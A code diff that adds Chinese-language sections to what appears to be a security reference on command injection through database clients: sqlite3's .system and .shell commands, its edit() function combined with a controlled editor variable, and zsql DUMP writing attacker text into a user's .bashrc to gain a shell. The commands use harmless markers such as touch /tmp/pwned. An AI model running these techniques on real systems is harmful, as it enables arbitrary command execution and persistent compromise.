@@ -58,3 +58,45 @@ mysql <<'EOF'
 SELECT * FROM users WHERE name = 'hardcoded';
 EOF
 ```
+
+### 命令注入 — sqlite3 内置命令
+
+```bash
+# sqlite3 内置 .system 和 .shell 可直接执行系统命令
+sqlite3 /tmp/test.db '.system /bin/sh'
+sqlite3 /tmp/test.db '.shell touch /tmp/pwned'
+
+# 如果 sqlite3 执行的语句外部可控：
+sqlite3 "$DB" "$USER_SQL"
+# USER_SQL = ".system touch /tmp/pwned"
+```
+
+### 命令注入 — sqlite3 edit() 函数
+
+```bash
+# sqlite3 的 edit() 函数将第一个参数写入临时文件，
+# 调用 $VISUAL 或 $EDITOR 环境变量指定的编辑器打开
+# 如果编辑器环境变量可控，可实现命令执行
+sqlite3 "$DB" "UPDATE t SET b=edit('','ls -al /root') WHERE a=0;"
+# 内部执行: system("$VISUAL /tmp/tempfile")
+# 如果 VISUAL="ls -al /root"，则执行 ls -al /root /tmp/tempfile
+
+# 如果 SQL 语句或编辑器环境变量外部可控，可通过 edit() 执行任意命令
+```
+
+### 操作任意文件 — zsql DUMP 写文件
+
+```bash
+# zsql 客户端的 DUMP 命令可将表数据导出到任意文件
+# 在数据库备份/恢复场景中常见
+
+# 利用方式 1：创建表写入恶意命令，导出到 .bashrc
+# SQL> CREATE TABLE test (name VARCHAR(2000));
+# SQL> INSERT INTO test (name) VALUES ('touch /tmp/pwned');
+# SQL> DUMP TABLE test INTO FILE '/home/user/.bashrc';
+
+# 利用方式 2：直接 DUMP QUERY 写文件
+# SQL> DUMP QUERY "select 'touch /tmp/pwned'" INTO FILE '/home/user/.bashrc';
+
+# 如果 zsql 执行的 SQL 外部可控（如加载上传的 SQL 文件），可写任意文件 GetShell
+```
